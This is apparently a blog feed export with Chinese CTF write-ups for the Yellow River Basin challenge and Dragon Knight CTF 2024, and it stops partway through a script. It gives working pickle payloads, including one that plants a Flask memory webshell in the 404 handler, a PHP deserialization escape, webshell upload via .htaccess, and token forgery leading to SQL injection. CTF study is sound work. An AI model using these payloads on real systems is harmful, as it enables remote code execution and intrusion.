    <id>http://example.com/2024/05/30/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9BWeb/</id>
    <published>2024-05-30T05:27:49.000Z</published>
    <updated>2024-05-30T05:28:35.208Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第二届黄河流域安全技能挑战赛复现"><a href="#第二届黄河流域安全技能挑战赛复现" class="headerlink" title="第二届黄河流域安全技能挑战赛复现"></a>第二届黄河流域安全技能挑战赛复现</h1><p>题目还挺不错的, 但是赛中没做, 这里看wp复现一下</p><p>膜拜大师傅wp <a href="https://www.cnblogs.com/gxngxngxn/p/18187578">https://www.cnblogs.com/gxngxngxn/p/18187578</a></p><h2 id="myfavorPython"><a href="#myfavorPython" class="headerlink" title="myfavorPython"></a>myfavorPython</h2><p>随便传一个opcode会发现并不是反序列化执行了, 而是用pickletools.dis, 一眼看出来了,但是以为这里还以为可以注入, 没想到这里其实是flask开了debug模式 直接构造报错就可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Python-revenge"><a href="#Python-revenge" class="headerlink" title="Python-revenge"></a>Python-revenge</h2><p>这个也是在gxngxngxn师傅对python内存马的研究orz</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18187578">https://www.cnblogs.com/gxngxngxn/p/18187578</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><p>之后随便打开一个404页面就可以命令执行</p><h2 id="逃跑大师"><a href="#逃跑大师" class="headerlink" title="逃跑大师"></a>逃跑大师</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span>, <span class="variable">$end</span> + <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$A</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$B</span> = <span class="string">&quot;HELLO&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$C</span> = <span class="string">&quot;!!!&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$A</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;A = <span class="variable">$A</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$this</span>-&gt;B . <span class="string">&quot;[welcome sdpcsec&quot;</span> .<span class="variable">$this</span>-&gt;C . <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;escape&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$Class</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;escape&#x27;</span>]);</span><br><span class="line">    <span class="variable">$Key</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$Class</span>);</span><br><span class="line">    <span class="variable">$K</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;SDPCSEC&quot;</span>, <span class="string">&quot;SanDieg0&quot;</span>, <span class="variable">$Key</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$K</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察mb_strpos与mb_substr执行差异导致的漏洞</p><p>这里我也测试了一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$start</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$data</span>[<span class="variable">$start</span>] . <span class="string">&#x27;&lt;/br&gt;&#x27;</span> ;</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$end</span> . <span class="string">&#x27; &#x27;</span> .  <span class="variable">$data</span>[<span class="variable">$end</span>] . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span>, <span class="variable">$end</span> + <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$_GET</span>[<span class="number">0</span>] . <span class="string">&quot;[welcome sdpcsec&quot;</span> .<span class="variable">$_GET</span>[<span class="number">1</span>] . <span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$key</span>;</span><br></pre></td></tr></table></figure><p>首先是<code>%9f</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515184216748.png" alt="image-20240515184216748"></p><p>可以看见这里的mb_strpos是直接忽略了<code>%9f</code>这个不可见字符, 而mb_substr并没有忽略, 而是正常处理, 这导致返回的字符整体向前移了一位</p><p>再来看<code>%f0</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515193637458.png" alt="image-20240515193637458"></p><p>这里mb_strpos是正常识别的, mb_substr把<code>%f0</code> 连着后面的三个字符识别成了一个字符</p><p>在mb_substr看来, 第0个字符是<code>%f0[we</code> , 第一个字符是<code>l</code> , 然后连着输出了后面21个字符</p><p>因此,<code>%9f</code>用来增加一个字符，<code>%f0</code>用来减少三个字符，我们利用这个特性，可以实现任意字符的构造</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515201303695.png" alt="image-20240515201303695"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515202049157.png" alt="image-20240515202049157"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第二届黄河流域安全技能挑战赛复现&quot;&gt;&lt;a href=&quot;#第二届黄河流域安全技能挑战赛复现&quot; class=&quot;headerlink&quot; title=&quot;第二届黄河流域安全技能挑战赛复现&quot;&gt;&lt;/a&gt;第二届黄河流域安全技能挑战赛复现&lt;/h1&gt;&lt;p&gt;题目还挺不错的, 但是赛中没</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Dragon Knight CTF 2024</title>
    <link href="http://example.com/2024/05/30/Dragon-Knight-CTF-2024/"/>
    <id>http://example.com/2024/05/30/Dragon-Knight-CTF-2024/</id>
    <published>2024-05-30T03:42:58.000Z</published>
    <updated>2024-05-30T03:44:27.153Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>直接扫码</p><h2 id="神秘文字"><a href="#神秘文字" class="headerlink" title="神秘文字"></a>神秘文字</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">𓅂=+![];𓂀=+!𓅂;𓁄=𓂀+𓂀;𓊎=𓁄+𓂀;𓆣=𓁄*𓁄;𓊝=𓊎+𓁄;𓆫=𓁄*𓊎;𓅬=𓆣+𓊎;[𓇎,𓏢,𓆗,𓃠,𓃀,𓋌,𓏁,𓇲,𓁣,𓁺,𓏁,𓇲,𓆦,𓏁,𓁣,𓇲,𓄬,𓇲,𓁣,𓏁,𓋌,𓁣,𓇲,𓏁,𓋌,𓇲]=(𓆡=&#x27;\\&quot;&#x27;)+!!𓆡+!𓆡+𓆡.𓆡+&#123;&#125;;𓆉=𓇲+𓁣+𓆦+𓁺+𓆗+𓃠+𓃀+𓇲+𓆗+𓁣+𓃠,𓆉=𓆉[𓆉][𓆉],𓄦=𓏁+𓁣+𓄬+𓆦,𓄀=𓃠+𓋌+𓆗+𓃀+𓃠+𓆦+&quot; &quot;;𓆉(𓆉(𓄀+𓏢+𓆉(𓄀+[...&quot;𓇎𓂀𓅂𓅬𓇎𓂀𓂀𓅬𓇎𓂀𓂀𓅬𓇎𓂀𓅂𓆣𓇎𓆣𓂀𓇎𓂀𓊎𓂀𓇎𓂀𓂀𓅬𓇎𓂀𓁄𓊝𓇎𓂀𓆫𓁄𓇎𓆣𓅂𓇎𓂀𓆫𓅂𓇎𓂀𓅂𓂀𓇎𓂀𓆫𓊎𓇎𓂀𓆫𓊎𓇎𓂀𓁄𓅬𓇎𓂀𓊝𓅬𓇎𓂀𓆫𓁄𓇎𓂀𓆣𓆣𓇎𓆣𓅂𓇎𓂀𓊝𓂀𓇎𓂀𓆫𓊎𓇎𓅬𓁄𓇎𓂀𓊝𓊝𓇎𓂀𓅂𓂀𓇎𓂀𓆫𓁄𓇎𓂀𓆫𓆣𓇎𓆫𓂀𓇎𓂀𓂀𓆫𓇎𓂀𓊎𓅬𓇎𓂀𓂀𓊎𓇎𓆫𓂀𓇎𓂀𓅂𓊝𓇎𓂀𓁄𓅂𓇎𓂀𓆫𓅂𓇎𓆫𓊎&quot;][𓄦]`+`)``+𓏢)``)``</span><br></pre></td></tr></table></figure><p>一眼jsFuck</p><p>放到本地node环境运行</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526202432238.png" alt="image-20240526202432238" /><p>拿到压缩包密码 mArt1N_K1EPp3</p><p>DRKCTF{D0_Y0u_KnOw_Wh0_Creat3_J5Fu*K?}</p><h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="羡慕群友每一天"><a href="#羡慕群友每一天" class="headerlink" title="羡慕群友每一天"></a>羡慕群友每一天</h2><p>谷歌识图直接可以识别到这个视频， 和图片里的摩天轮一模一样</p><p><a href="https://www.youtube.com/watch?app=desktop&v=2JY1s5UysPk&ab_channel=ActionKid">https://www.youtube.com/watch?app=desktop&amp;v=2JY1s5UysPk&amp;ab_channel=ActionKid</a></p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240525143303296.png" alt="image-20240525143303296" /><p>去谷歌地图找到精确位置</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240525143102076.png" alt="image-20240525143102076" /><p>DRKCTF{美国-佛罗里达州-迈阿密市-Skyviews}</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezsign"><a href="#ezsign" class="headerlink" title="ezsign"></a>ezsign</h2><p>进去之后是一个登录，admin&#x2F;admin</p><p>是一个前端的留言板， 没什么用</p><p>扫描一下目录</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526190725821.png" alt="image-20240526190725821" /><p> 可以看见还是能扫描出来很多东西，包括.DS_Store</p><p>github上随便找一个利用的.DS_Store工具， 我这里用的是ds_store_exp</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526193540195.png" alt="image-20240526193540195" /><p>主要看这个index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 检查 cookie 中是否有 token</span></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$token</span>);</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$token</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$token</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$token</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$isLocal</span> = <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$isLocal</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$isLocal</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome Back，&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">        <span class="comment">//如果 upload 目录下存在$username.png文件，则显示图片</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$token</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">// 显示图片，缩小图片</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;upload/&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$token</span>[<span class="string">&#x27;filename&#x27;</span>] .<span class="string">&#x27;&quot; width=&quot;200&quot;&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;请上传您高贵的头像。&#x27;</span>;</span><br><span class="line">            <span class="comment">// 写一个上传头像的功能</span></span><br><span class="line">            <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">            &lt;form method=&quot;post&quot; action=&quot;upload.php&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            EOD</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// echo &quot;留个言吧&quot;;</span></span><br><span class="line">        <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">        &lt;h1&gt;留言板&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;label for=&quot;input-text&quot;&gt;Enter some text:&lt;/label&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; id=&quot;input-text&quot; placeholder=&quot;Type here...&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;button onclick=&quot;displayInput()&quot;&gt;Display&lt;/button&gt;</span></span><br><span class="line"><span class="string">        EOD</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Login&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;Login&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;post&quot; action=&quot;./login.php&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; required&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOD</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">displayInput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> inputText = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&quot;input-text&quot;</span>).value;</span><br><span class="line">      document.<span class="title function_ invoke__">write</span>(inputText)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>里面有一个上传文件的功能点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;upload.php&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload&quot;</span>&gt;</span><br><span class="line">            &lt;/form&gt;</span><br></pre></td></tr></table></figure><p>要进入这个功能点需要满足 <code>$isLocal</code>为真</p><p>注意到这个<code>extract($_GET);</code></p><p>可以通过get传参直接去覆盖$_SERVER[‘REMOTE_ADDR’]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$isLocal</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是其实这里也完全没必要, 直接给把那段上传的html代码粘贴到网站里给upload.php上传文件就行, 这里我们正常做</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526194419508.png" alt="image-20240526194419508" /><p>这里上传一个php木马, 直接去upload目录下访问是不会解析的, 原因未知, 一开始猜测是用了file_get_contents, 但是当我尝试传了一个.htaccess再访问时发现403了</p><p>那么构造.htaccess把png解析成php</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526194928431.png" alt="image-20240526194928431" /><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526195805665.png" alt="image-20240526195805665" /><p>之后yijian连接即可</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526195921876.png" alt="image-20240526195921876" /><h2 id="EzLogin"><a href="#EzLogin" class="headerlink" title="EzLogin"></a>EzLogin</h2><p>进去看网站源码有一个提示&#x2F;register.html 可以注册用户</p><p>先随便注册一个账号 abc&#x2F;123, 去登录得到一个cookie, 并且提示我们不是admin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">65794a3163325679626d46745a534936496d46695979497349434a306232746c62694936496a6b774d4445314d446b344d324e6b4d6a526d596a426b4e6a6b324d3259335a4449345a5445335a6a637949697767496d6c7a5832466b62576c75496a6f7766513d3d</span><br></pre></td></tr></table></figure><p>一眼hex, 后面还有一层base64</p><p>解码后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;abc&quot;, &quot;token&quot;:&quot;900150983cd24fb0d6963f7d28e17f72&quot;, &quot;is_admin&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>修改这个is_admin为1再访问, 这次会回显我们的密码, 当我们为伪造token中的username为admin会被检测到</p><p>再看这个token,很像md5</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526201250853.png" alt="image-20240526201250853" /><p>这个就是账号的md5</p><p>这里比较坑就在于你的username必须足够简单不然发现不了这个</p><p>那么就可以更改username和md5来伪造token了</p><p>手搓很麻烦 , 写个脚本测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">EncodeToken</span>(<span class="params">original_string</span>):</span><br><span class="line">    base64_encoded = base64.b64encode(original_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    hex_string = base64_encoded.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> hex_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DecodeToken</span>(<span class="params">hex_str</span>):</span><br><span class="line">    b64_str = <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line">    token_str = base64.b64decode(b64_str)</span><br><span class="line">    <span class="keyword">return</span> token_str.decode()</span><br></pre></td></tr></table></figure><p>大概这样两个函数即可</p><p>之后会发现username其实有一个sql注入 布尔注入</p><p>过滤了空格 <code>&gt;</code> <code>&lt;</code> <code>between and</code>  </p><p>很难二分, 好在服务器比较快, 直接爆了</p><p>贴一下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 